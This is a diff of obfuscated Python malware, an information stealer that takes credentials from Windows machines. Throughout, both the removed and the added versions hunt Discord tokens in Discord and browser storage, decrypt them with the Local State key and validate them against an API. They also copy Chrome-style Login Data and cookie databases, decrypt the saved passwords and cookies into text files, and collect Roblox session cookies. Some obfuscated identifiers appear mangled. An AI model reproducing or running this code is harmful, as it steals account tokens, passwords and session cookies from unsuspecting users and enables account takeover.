-        lllIIIlIlIlIIllI = llIIllIlIllIIlIIll(lllIIIlIlIlIIllI, None, None, None, 0)[1]
-        return lllIIIlIlIlIIllI
-    def llllIIlIIIl(IIIIIIIllIllIIII):
-        llIllllIIllllII = {
-            'Discord': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-            'Opera GX': IIIIIIIllIllIIII.IIIllIIllIlllIlllII + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome SxS': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome1': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
-            'Chrome2': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
-            'Chrome3': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
-            'Chrome4': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
-            'Chrome5': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
-            'Epic Privacy Browser': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
-            'Uran': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Yandex': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Brave': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'CocCoc': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'CocCoc1': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'CocCoc2': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'CocCoc3': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
-        for IllIlIIlIIllIlIIlIl, lIllIIllI in llIllllIIllllII.items():
-            if not os.lIllIIllI.exists(lIllIIllI):
+    def llIlIIlIlIII(lIIlllllllIlI, lllIllIIlIlllllIIIIl):
+        with open(lllIllIIlIlllllIIIIl, "r", encoding="utf-8") as llllIlIlll:
+            lIlllIIlIIIIIlIII = llllIlIlll.read()
+        IlllIIIIlIIIlIl = json.loads(lIlllIIlIIIIIlIII)
+        IIlIllIllIIlIII = base64.b64decode(IlllIIIIlIIIlIl["os_crypt"]["encrypted_key"])
+        IIlIllIllIIlIII = IIlIllIllIIlIII[5:]
+        IIlIllIllIIlIII = lIIIlllllI(IIlIllIllIIlIII, None, None, None, 0)[1]
+        return IIlIllIllIIlIII
+    def IIIIlllIl(lIIlllllllIlI):
+        IlIIlllIIIlllIllIlll = {
+            'Discord': lIIlllllllIlI.IllllllI + '\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': lIIlllllllIlI.IllllllI + '\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': lIIlllllllIlI.IllllllI + '\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': lIIlllllllIlI.IllllllI + '\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': lIIlllllllIlI.IllllllI + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': lIIlllllllIlI.IllllllI + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': lIIlllllllIlI.IlIlIIllIIll + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': lIIlllllllIlI.IlIlIIllIIll + '\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': lIIlllllllIlI.IlIlIIllIIll + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': lIIlllllllIlI.IlIlIIllIIll + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': lIIlllllllIlI.IlIlIIllIIll + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': lIIlllllllIlI.IlIlIIllIIll + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': lIIlllllllIlI.IlIlIIllIIll + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': lIIlllllllIlI.IlIlIIllIIll + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome1': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
+            'Chrome2': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
+            'Chrome3': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
+            'Chrome4': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
+            'Chrome5': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': lIIlllllllIlI.IlIlIIllIIll + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': lIIlllllllIlI.IlIlIIllIIll + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Uran': lIIlllllllIlI.IlIlIIllIIll + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': lIIlllllllIlI.IlIlIIllIIll + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': lIIlllllllIlI.IlIlIIllIIll + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'CocCoc': lIIlllllllIlI.IlIlIIllIIll + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'CocCoc1': lIIlllllllIlI.IlIlIIllIIll + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'CocCoc2': lIIlllllllIlI.IlIlIIllIIll + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'CocCoc3': lIIlllllllIlI.IlIlIIllIIll + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': lIIlllllllIlI.IlIlIIllIIll + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
+        for lIIlllIlIlIIlII, lllIllIIlIlllllIIIIl in IlIIlllIIIlllIllIlll.items():
+            if not os.lllIllIIlIlllllIIIIl.exists(lllIllIIlIlllllIIIIl):
                 continue
-            IlIIlIIlIIlIlIlIII = IllIlIIlIIllIlIIlIl.replace(" ", "").lower()
-            if "cord" in lIllIIllI:
-                if os.lIllIIllI.exists(IIIIIIIllIllIIII.IIIllIIllIlllIlllII + lIIIIllIlIIIllIIl'\\{lIIIlIIIlllIIllIIllIIllllllIlsIlIlIIlllllIlIIlIIlllIII}\\Local State'):
-                    for lllIIllllIlI in os.listdir(lIllIIllI):
-                        if lllIIllllIlI[-3:] not in ["log", "ldb"]:
+            IlIllIIIIIlIllIIl = lIIlllIlIlIIlII.replace(" ", "").lower()
+            if "cord" in lllIllIIlIlllllIIIIl:
+                if os.lllIllIIlIlllllIIIIl.exists(lIIlllllllIlI.IllllllI + llllIlIlll'\\{IlIllIIIIIlIllIIIIIlIIllIlIlllIllI}\\Local State'):
+                    for lIIIIIlIIlI in os.listdir(lllIllIIlIlllllIIIIl):
+                        if lIIIIIlIIlI[-3:] not in ["log", "ldb"]:
                             continue
-                        for IIIIIIllllIIIllll in [llIllIlIllIllllll.strip() for llIllIlIllIllllll in open(lIIIIllIlIIIllIIl'{pllIlIlIIIIIIllIlIIlIIIIIIIllh}\\{lllIIllllIIlIIlllIII}', errors='ignore').readlines() if llIllIlIllIllllll.strip()]:
-                            for llIIllIIIllIIlIl in re.findall(IIIIIIIllIllIIII.IIllIIIlIlll, IIIIIIllllIIIllll):
+                        for lIIlIllllIlIlIl in [lIllllIlIl.strip() for lIllllIlIl in open(llllIlIlll'{plIlIlIIIlIlllIlllIIlIllIIllIlIIIIh}\\{lIIIIIlIIIIIlIIllIlIlllIllII}', errors='ignore').readlines() if lIllllIlIl.strip()]:
+                            for lIIlIIlIIIIIlllI in re.findall(lIIlllllllIlI.IIlIIlIllllI, lIIlIllllIlIlIl):
                                 try:
-                                    IIIIIIIIlIIIlIlII = IIIIIIIllIllIIII.lIlIIlllIIlIllII(base64.b64decode(llIIllIIIllIIlIl.split('dQw4w9WgXcQ:')[1]), IIIIIIIllIllIIII.IIIllIlIIlll(IIIIIIIllIllIIII.IIIllIIllIlllIlllII + lIIIIllIlIIIllIIl'\\{lIIIlIIIlllIIllIIllIIllllllIlsIlIlIIlllllIlIIlIIlllIII}\\Local State'))
+                                    lIIlIIIlIIl = lIIlllllllIlI.IIlIllIIIllllIII(base64.b64decode(lIIlIIlIIIIIlllI.split('dQw4w9WgXcQ:')[1]), lIIlllllllIlI.llIlIIlIlIII(lIIlllllllIlI.IllllllI + llllIlIlll'\\{IlIllIIIIIlIllIIIIIlIIllIlIlllIllI}\\Local State'))
                                 except ValueError:
                                     pass
                                 try:
-                                    IIlllIIlIlIlI = requests.get(IIIIIIIllIllIIII.lIIlIllllllIII, IIllIlIIlIIl={
+                                    IlIIllIll = requests.get(lIIlllllllIlI.IIlIlIIllIllIII, IlIIllIIIl={
                                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                         'Content-Type': 'application/json',
-                                        'Authorization': IIIIIIIIlIIIlIlII})
+                                        'Authorization': lIIlIIIlIIl})
                                 except Exception:
                                     pass
-                                if IIlllIIlIlIlI.status_code == 200:
-                                    lIlIIIlIllIII = IIlllIIlIlIlI.json()['id']
-                                    if lIlIIIlIllIII not in IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl:
-                                        IIIIIIIllIllIIII.IlIlIlIlll.append(IIIIIIIIlIIIlIlII)
-                                        IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl.append(lIlIIIlIllIII)
+                                if IlIIllIll.status_code == 200:
+                                    lIlllIlIIIIIIlI = IlIIllIll.json()['id']
+                                    if lIlllIlIIIIIIlI not in lIIlllllllIlI.lIIllIIllllll:
+                                        lIIlllllllIlI.IIlIlllI.append(lIIlIIIlIIl)
+                                        lIIlllllllIlI.lIIllIIllllll.append(lIlllIlIIIIIIlI)
             else:
-                for lllIIllllIlI in os.listdir(lIllIIllI):
-                    if lllIIllllIlI[-3:] not in ["log", "ldb"]:
+                for lIIIIIlIIlI in os.listdir(lllIllIIlIlllllIIIIl):
+                    if lIIIIIlIIlI[-3:] not in ["log", "ldb"]:
                         continue
-                    for IIIIIIllllIIIllll in [llIllIlIllIllllll.strip() for llIllIlIllIllllll in open(lIIIIllIlIIIllIIl'{pllIlIlIIIIIIllIlIIlIIIIIIIllh}\\{lllIIllllIIlIIlllIII}', errors='ignore').readlines() if llIllIlIllIllllll.strip()]:
-                        for IIIIIIIIlIIIlIlII in re.findall(IIIIIIIllIllIIII.lIlIlIlllIIlIII, IIIIIIllllIIIllll):
+                    for lIIlIllllIlIlIl in [lIllllIlIl.strip() for lIllllIlIl in open(llllIlIlll'{plIlIlIIIlIlllIlllIIlIllIIllIlIIIIh}\\{lIIIIIlIIIIIlIIllIlIlllIllII}', errors='ignore').readlines() if lIllllIlIl.strip()]:
+                        for lIIlIIIlIIl in re.findall(lIIlllllllIlI.IllIIIllIlIl, lIIlIllllIlIlIl):
                             try:
-                                IIlllIIlIlIlI = requests.get(IIIIIIIllIllIIII.lIIlIllllllIII, IIllIlIIlIIl={
+                                IlIIllIll = requests.get(lIIlllllllIlI.IIlIlIIllIllIII, IlIIllIIIl={
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
-                                    'Authorization': IIIIIIIIlIIIlIlII})
+                                    'Authorization': lIIlIIIlIIl})
                             except Exception:
                                 pass
-                            if IIlllIIlIlIlI.status_code == 200:
-                                lIlIIIlIllIII = IIlllIIlIlIlI.json()['id']
-                                if lIlIIIlIllIII not in IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl:
-                                    IIIIIIIllIllIIII.IlIlIlIlll.append(IIIIIIIIlIIIlIlII)
-                                    IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl.append(lIlIIIlIllIII)
-        if os.lIllIIllI.exists(IIIIIIIllIllIIII.IIIllIIllIlllIlllII + "\\Mozilla\\Firefox\\Profiles"):
-            for lIllIIllI, lIlIIlIllllllIlIIIIl, IIllIIIIlIllIllII in os.walk(IIIIIIIllIllIIII.IIIllIIllIlllIlllII + "\\Mozilla\\Firefox\\Profiles"):
-                for IlllllIIIllIIlIlI in IIllIIIIlIllIllII:
-                    if not IlllllIIIllIIlIlI.endswith('.sqlite'):
+                            if IlIIllIll.status_code == 200:
+                                lIlllIlIIIIIIlI = IlIIllIll.json()['id']
+                                if lIlllIlIIIIIIlI not in lIIlllllllIlI.lIIllIIllllll:
+                                    lIIlllllllIlI.IIlIlllI.append(lIIlIIIlIIl)
+                                    lIIlllllllIlI.lIIllIIllllll.append(lIlllIlIIIIIIlI)
+        if os.lllIllIIlIlllllIIIIl.exists(lIIlllllllIlI.IllllllI + "\\Mozilla\\Firefox\\Profiles"):
+            for lllIllIIlIlllllIIIIl, IIllIIllllIlIIlIl, IIllllIlllIlIlIIl in os.walk(lIIlllllllIlI.IllllllI + "\\Mozilla\\Firefox\\Profiles"):
+                for IllIlIIl in IIllllIlllIlIlIIl:
+                    if not IllIlIIl.endswith('.sqlite'):
                         continue
-                    for IIIIIIllllIIIllll in [llIllIlIllIllllll.strip() for llIllIlIllIllllll in open(lIIIIllIlIIIllIIl'{pllIlIlIIIIIIllIlIIlIIIIIIIllh}\\{lIlIIlIllllllIlIIIIllIIIIllIlIIIllIIllIIllllllIllIIlIlIIIlIlIIIlIIlllIIII}', errors='ignore').readlines() if llIllIlIllIllllll.strip()]:
-                        for IIIIIIIIlIIIlIlII in re.findall(IIIIIIIllIllIIII.lIlIlIlllIIlIII, IIIIIIllllIIIllll):
+                    for lIIlIllllIlIlIl in [lIllllIlIl.strip() for lIllllIlIl in open(llllIlIlll'{plIlIlIIIlIlllIlllIIlIllIIllIlIIIIh}\\{IIllIIllllIlIIlIllIIIIlllIIIIlIIllIlIlllIllI}', errors='ignore').readlines() if lIllllIlIl.strip()]:
+                        for lIIlIIIlIIl in re.findall(lIIlllllllIlI.IllIIIllIlIl, lIIlIllllIlIlIl):
                             try:
-                                IIlllIIlIlIlI = requests.get(IIIIIIIllIllIIII.lIIlIllllllIII, IIllIlIIlIIl={
+                                IlIIllIll = requests.get(lIIlllllllIlI.IIlIlIIllIllIII, IlIIllIIIl={
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
-                                    'Authorization': IIIIIIIIlIIIlIlII})
+                                    'Authorization': lIIlIIIlIIl})
                             except Exception:
                                 pass
-                            if IIlllIIlIlIlI.status_code == 200:
-                                lIlIIIlIllIII = IIlllIIlIlIlI.json()['id']
-                                if lIlIIIlIllIII not in IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl:
-                                    IIIIIIIllIllIIII.IlIlIlIlll.append(IIIIIIIIlIIIlIlII)
-                                    IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl.append(lIlIIIlIllIII)
-    def llIIlllI(IIIIIIIllIllIIII, lIlIIIlIlllll: str or os.PathLike = gettempdir()):
-        lllIIllllIlI = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for lIlIIlIllllllIlIIIIl in range(random.randint(10, 20)))
-        lIllIIllI = os.lIllIIllI.join(lIlIIIlIlllll, lllIIllllIlI)
-        open(lIllIIllI, "x")
-        return lIllIIllI
-    @llIIllllIllIIllIlIll
-    def IllIlIIll(IIIIIIIllIllIIII, IllIlIIlIIllIlIIlIl: str, lIllIIllI: str, IllIIlllIlI: str):
-        lIllIIllI += '\\' + IllIIlllIlI + '\\Login Data'
-        if not os.lIllIIllI.isfile(lIllIIllI):
+                            if IlIIllIll.status_code == 200:
+                                lIlllIlIIIIIIlI = IlIIllIll.json()['id']
+                                if lIlllIlIIIIIIlI not in lIIlllllllIlI.lIIllIIllllll:
+                                    lIIlllllllIlI.IIlIlllI.append(lIIlIIIlIIl)
+                                    lIIlllllllIlI.lIIllIIllllll.append(lIlllIlIIIIIIlI)
+    def llIIlllIIIlllIIlIlll(lIIlllllllIlI, IlIlIIIllIIllIl: str or os.PathLike = gettempdir()):
+        lIIIIIlIIlI = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for IIllIIllllIlIIlIl in range(random.randint(10, 20)))
+        lllIllIIlIlllllIIIIl = os.lllIllIIlIlllllIIIIl.join(IlIlIIIllIIllIl, lIIIIIlIIlI)
+        open(lllIllIIlIlllllIIIIl, "x")
+        return lllIllIIlIlllllIIIIl
+    @llIIIlIlllIlllll
+    def IIllllllIIllIl(lIIlllllllIlI, lIIlllIlIlIIlII: str, lllIllIIlIlllllIIIIl: str, IlllIIlllIllllIIII: str):
+        lllIllIIlIlllllIIIIl += '\\' + IlllIIlllIllllIIII + '\\Login Data'
+        if not os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl):
             return
-        lIIlIIlllllI = IIIIIIIllIllIIII.llIIlllI()
-        copy2(lIllIIllI, lIIlIIlllllI)
-        lIIlllIlll = sqlite3.connect(lIIlIIlllllI)
-        llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
-        with open(os.lIllIIllI.join(IIIIIIIllIllIIII.llIIIIllIIl, "Browsers", "All Passwords.txt"), 'a', encoding="utf-8") as lIIIIllIlIIIllIIl:
-            for llIIllIIlIIIIIIl in llIIlIlllIIIlIllIl.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
-                llIlIlIlIIIIIIIIIl, llIlllIIIIlll, IlIIllIlIIIIlllIIII = llIIllIIlIIIIIIl
-                IlIIllIlIIIIlllIIII = IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(IlIIllIlIIIIlllIIII, IIIIIIIllIllIIII.IIlIlIlIlIlIIlIllI)
-                if llIlIlIlIIIIIIIIIl != "":
-                    lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"URL: {llIlIlIlIIIIIIIIIl}\nID: {IIIllIlIIIlIlIIIIllIIllIlIIlIIllIlIIlIl}\nPASSW0RD: {pllIlIlIIIIIIllIlIIlsswoIIlllIIlIlIIlIIlllIIIlIIIlIIIlllIIllIIl}\n\n")
-        llIIlIlllIIIlIllIl.close()
-        lIIlllIlll.close()
-        os.remove(lIIlIIlllllI)
-    @llIIllllIllIIllIlIll
-    def IIIlIlllIl(IIIIIIIllIllIIII, IllIlIIlIIllIlIIlIl: str, lIllIIllI: str, IllIIlllIlI: str):
-        lIllIIllI += '\\' + IllIIlllIlI + '\\Network\\Cookies'
-        if not os.lIllIIllI.isfile(lIllIIllI):
+        IlIlIIlIIlllI = lIIlllllllIlI.llIIlllIIIlllIIlIlll()
+        copy2(lllIllIIlIlllllIIIIl, IlIlIIlIIlllI)
+        IlIIIlIII = sqlite3.connect(IlIlIIlIIlllI)
+        IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
+        with open(os.lllIllIIlIlllllIIIIl.join(lIIlllllllIlI.IllllIlIllIllIIlll, "Browsers", "All Passwords.txt"), 'a', encoding="utf-8") as llllIlIlll:
+            for IIllIllIllllIllIlI in IlIIIlIIIlll.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
+                lIIlllllIIIlIlIIlIl, IIIlllIIlIlIIllllIIl, IIllIIIIlIIl = IIllIllIllllIllIlI
+                IIllIIIIlIIl = lIIlllllllIlI.lIIIIIllIl(IIllIIIIlIIl, lIIlllllllIlI.IIIlIlIIIl)
+                if lIIlllllIIIlIlIIlIl != "":
+                    llllIlIlll.write(llllIlIlll"URL: {uIlIIllIlll}\nID: {IIIlllIIlIlIIllllIIl}\nPASSW0RD: {IIllIIIIlIIIIIlIIllIlIlllIllI}\n\n")
+        IlIIIlIIIlll.close()
+        IlIIIlIII.close()
+        os.remove(IlIlIIlIIlllI)
+    @llIIIlIlllIlllll
+    def lIlllIIlIl(lIIlllllllIlI, lIIlllIlIlIIlII: str, lllIllIIlIlllllIIIIl: str, IlllIIlllIllllIIII: str):
+        lllIllIIlIlllllIIIIl += '\\' + IlllIIlllIllllIIII + '\\Network\\Cookies'
+        if not os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl):
             return
-        lIlIIlllIIIllIIl = IIIIIIIllIllIIII.llIIlllI()
-        copy2(lIllIIllI, lIlIIlllIIIllIIl)
-        lIIlllIlll = sqlite3.connect(lIlIIlllIIIllIIl)
-        llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
-        with open(os.lIllIIllI.join(IIIIIIIllIllIIII.llIIIIllIIl, "Browsers", "All Cookies.txt"), 'a', encoding="utf-8") as lIIIIllIlIIIllIIl:
-            for llIIllIIlIIIIIIl in llIIlIlllIIIlIllIl.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
-                lIlllIIlIll, IllIlIIlIIllIlIIlIl, lIllIIllI, IlllIIlIlllI, IIIIllIII = llIIllIIlIIIIIIl
-                lllIllIlII = IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(IlllIIlIlllI, IIIIIIIllIllIIII.IIlIlIlIlIlIIlIllI)
-                if lIlllIIlIll and IllIlIIlIIllIlIIlIl and lllIllIlII != "":
-                    lIIIIllIlIIIllIIl.write("{}\t{}\t{}\t{}\t{}\t{}\IIIIIIIlIlIIlllII{}\n".format(
-                        lIlllIIlIll, 'FALSE' if IIIIllIII == 0 else 'TRUE', lIllIIllI, 'FALSE' if lIlllIIlIll.startswith('.') else 'TRUE', IIIIllIII, IllIlIIlIIllIlIIlIl, lllIllIlII))
-        llIIlIlllIIIlIllIl.close()
-        lIIlllIlll.close()
-        os.remove(lIlIIlllIIIllIIl)
-    @llIIllllIllIIllIlIll
-    def lIllllIIIllIIlIII(IIIIIIIllIllIIII):
-        lIIIIllIlIIIllIIl = open(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
-        for lIIlIlIlIlIII in os.listdir(IIIIIIIllIllIIII.llIlIlIllIlIII):
-            if re.match(IIIIIIIllIllIIII.IIIIlIIIlIIllllllII, lIIlIlIlIlIII):
-                IlllllIlllIIIlll = ntpath.join(IIIIIIIllIllIIII.llIlIlIllIlIII, lIIlIlIlIlIII, 'Login Data')
-                IlllIIIlIIIll = IIIIIIIllIllIIII.IIllIllIllIIllllIII()
-                shutil.copy2(IlllllIlllIIIlll, IlllIIIlIIIll)
-                lIIlllIlll = sqlite3.connect(IlllIIIlIIIll)
-                llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
-                llIIlIlllIIIlIllIl.execute("SELECT action_url, username_value, password_value FROM logins")
-                for IIlllIIlIlIlI in llIIlIlllIIIlIllIl.fetchall():
-                    llIlIlIlIIIIIIIIIl = IIlllIIlIlIlI[0]
-                    llIlllIIIIlll = IIlllIIlIlIlI[1]
-                    llIlIIIllIllIIlIlIlI = IIlllIIlIlIlI[2]
-                    IllIIIlllIII = IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(llIlIIIllIllIIlIlIlI, IIIIIIIllIllIIII.IIllllIllIIIlI)
-                    if llIlIlIlIIIIIIIIIl != "":
-                        lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"URL: {llIlIlIlIIIIIIIIIl}\nID: {IIIllIlIIIlIlIIIIllIIllIlIIlIIllIlIIlIl}\nPASSW0RD: {deIlIlIIlllllIlIlIrllIIllIIIllIIlIlpIIIIIIIllIIlIlIIIlIlIIlIIdlIlIIlIllllllIlIIIIlpllIlIlIIIIIIllIlIIlsswoIIlllIIlIlIIlIIlllIIIlIIIlIIIlllIIllIIl}\n\n")
-                llIIlIlllIIIlIllIl.close()
-                lIIlllIlll.close()
-                os.remove(IlllIIIlIIIll)
-        lIIIIllIlIIIllIIl.close()
-    @llIIllllIllIIllIlIll
-    def lIIllIlIIlllIII(IIIIIIIllIllIIII):
-        lIIIIllIlIIIllIIl = open(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
-        for lIIlIlIlIlIII in os.listdir(IIIIIIIllIllIIII.llIlIlIllIlIII):
-            if re.match(IIIIIIIllIllIIII.IIIIlIIIlIIllllllII, lIIlIlIlIlIII):
-                IlllllIlllIIIlll = ntpath.join(IIIIIIIllIllIIII.llIlIlIllIlIII, lIIlIlIlIlIII, 'Network', 'cookies')
-                IlllIIIlIIIll = IIIIIIIllIllIIII.IIllIllIllIIllllIII()
-                shutil.copy2(IlllllIlllIIIlll, IlllIIIlIIIll)
-                lIIlllIlll = sqlite3.connect(IlllIIIlIIIll)
-                llIIlIlllIIIlIllIl = lIIlllIlll.llIIlIlllIIIlIllIl()
-                llIIlIlllIIIlIllIl.execute("SELECT host_key, name, encrypted_value from cookies")
-                for IIlllIIlIlIlI in llIIlIlllIIIlIllIl.fetchall():
-                    lIIIlllIIIIlIIIl = IIlllIIlIlIlI[0]
-                    IIIllIlIIIlIlIIIIllI = IIlllIIlIlIlI[1]
-                    IIlIIlIlIlIllII = IIIIIIIllIllIIII.IIIlllIIIIIlIllIIll(IIlllIIlIlIlI[2], IIIIIIIllIllIIII.IIllllIllIIIlI)
-                    if lIIIlllIIIIlIIIl != "":
-                        lIIIIllIlIIIllIIl.write(lIIIIllIlIIIllIIl"{lIIIlllIIIIlIIIl}	TRUE"+"		"+ f"/FALSE	2597573456	{IIIllIlIIIlIlIIIIllI}	{IIlIIlIlIlIllII}\n")
-                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in IIlIIlIlIlIllII:
-                        IIIIIIIllIllIIII.llIlllllIIIl.append(IIlIIlIlIlIllII)
